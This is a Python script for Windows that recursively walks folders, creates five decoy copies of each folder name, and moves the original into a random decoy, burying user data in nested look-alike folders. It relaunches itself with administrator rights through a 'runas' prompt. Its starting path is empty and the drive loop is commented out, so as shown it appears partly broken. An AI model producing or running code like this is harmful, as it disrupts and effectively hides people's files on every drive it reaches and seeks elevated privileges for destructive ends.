import os,shutil,random,ctypes,sys

#get into a drive
#Duplicate the folders
    #change the original file
    #if there are files inside of it
        #redo duplicate
    #else
        #redo getinto
#redo 

def main():
    #"E:/Abb/"
    PATH = ''
    drives = list_drives()
    #for drive in drives:
        #PATH += drive
    file_cruser(PATH)
    return

def list_drives():
    drives = []

    for drive in range(ord('A'),ord('Z') + 1):
        drive_letter = chr(drive) + ':/'
        if os.path.exists(drive_letter):
            drives.append(drive_letter)
    
    return drives

def list_file(PATH):
    try:
        folders = [folder for folder in os.listdir(PATH) if os.path.isdir(os.path.join(PATH, folder)) and folder[0] != '$']
        return folders
    except:
        return ''

def file_cruser(PATH):
    folders = list_file(PATH)

    if len(folders) > 0:
        for folder in folders:
            newPATH = PATH
            newPATH += '/' + folder
            #print("Currently in:\n",newPATH)
            file_cruser(newPATH)
            NextFolders = list_file(newPATH)
            if len(NextFolders) > 0:
                try:
                    Duplicate(PATH,folder)
                except Exception as e:
                    print(f"Couldn't duplicate the tree:{e}")
            else:
                pass

    else:
        newPathList = PATH.rsplit('/',1)
        Path = newPathList[0]
        FolderName = newPathList[1]
        try:
            Duplicate(Path,FolderName)
        except Exception as e:
            print(f"Couldn't duplicate the folder:{e}")

def Duplicate(PATH,Name):
    #print("Duplicated:",PATH,f"({Name})")
    try:
        os.chdir(PATH)
    except Exception as e:
        print(e)
        input("Press Enter to exit...")
    
    duplicates = 5
    for i in range(duplicates):
        newName = f"{Name}{i}"
        try:
            os.mkdir(newName)
        except:
            pass

    duplicatedFolders = [folder for folder in os.listdir(PATH) if Name in folder]
    #print(duplicatedFolders)
    HiderPath = ''
    
    max = len(duplicatedFolders) - 1
    if max > 1:
        index = random.randint(1,max)
        src = PATH + '/' + Name
        dest = PATH + '/' + duplicatedFolders[index]
        HiderPath = dest
        dest += '/'
        destination = shutil.move(src,dest)
    else:
        pass

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if __name__ == "__main__":
    if is_admin():
        try:
            main()
        except Exception as e:
            print(f"An error occurred: {e}")
            input("Press Enter to exit...")
    
    else:
        print("Not running as administrator. Re-running with admin privileges...")
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script] + sys.argv[1:])
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
            input("Press Enter to exit...")
        except Exception as e:
            print(f"Failed to elvavate to admin previlages: {e}")
            input("Press Enter to exit...")